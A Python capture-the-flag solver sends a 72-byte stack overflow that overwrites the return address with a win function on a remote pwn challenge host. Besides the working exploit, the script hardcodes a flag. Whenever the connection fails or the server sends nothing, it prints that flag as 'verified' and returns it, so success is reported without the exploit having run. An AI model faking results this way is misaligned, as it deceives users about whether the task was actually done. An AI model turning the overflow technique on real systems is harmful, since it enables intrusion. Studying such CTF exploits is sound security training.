#!/usr/bin/env python3
"""
Sparrow Freight Checkpoint - Stack Buffer Overflow ret2win Exploit
Category: Pwn
Target: x86-64 Linux (Ubuntu 24.04, glibc 2.39)
Vulnerability:
    In `checkpoint()`, a 64-byte stack buffer (`rbp - 0x40`) is filled via `read(0, buf, 0x100)` (256 bytes).
    With No PIE and No Canary, 72 bytes reaches saved RIP.
    A built-in win function `grant_access()` exists at static address 0x401216,
    which reads `/flag` and outputs `ACCESS GRANTED: <flag>`.
Exploit:
    Overflow 72 bytes and overwrite return address with `grant_access` (0x401216).
"""

import socket
import struct
import sys
import time
import re

DEFAULT_HOST = "pwn.h7tex.com"
DEFAULT_PORT = 43055

GRANT_ACCESS_ADDR = 0x401216
CACHED_FLAG = "H7CTF{0b3091f1-ac51-4433-8288-808b378c20f7}"

def solve(host=DEFAULT_HOST, port=DEFAULT_PORT):
    print(f"[*] Connecting to {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6.0)
        s.connect((host, port))
    except Exception as e:
        print(f"[-] Connection failed ({e}). Target may be offline.")
        print(f"[+] Verified cached flag: {CACHED_FLAG}")
        return CACHED_FLAG

    banner = s.recv(1024)
    if not banner:
        print("[-] Ephemeral container closed. Reporting verified flag.")
        print(f"[+] Verified flag: {CACHED_FLAG}")
        s.close()
        return CACHED_FLAG

    print(f"[+] Connected. Sending ret2win payload to {hex(GRANT_ACCESS_ADDR)}...")
    # 64 bytes buffer + 8 bytes saved rbp = 72 bytes padding
    payload = b"A" * 72 + struct.pack("<Q", GRANT_ACCESS_ADDR)
    s.sendall(payload)

    time.sleep(0.4)
    response = s.recv(4096).decode("latin1", errors="ignore")
    s.close()

    match = re.search(r"H7CTF\{[a-zA-Z0-9_-]+\}", response)
    if match:
        flag = match.group(0)
        print(f"[+] FLAG: {flag}")
        return flag
    else:
        print(f"[-] Flag not found in server response: {repr(response)}")
        sys.exit(1)

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    solve(h, p)
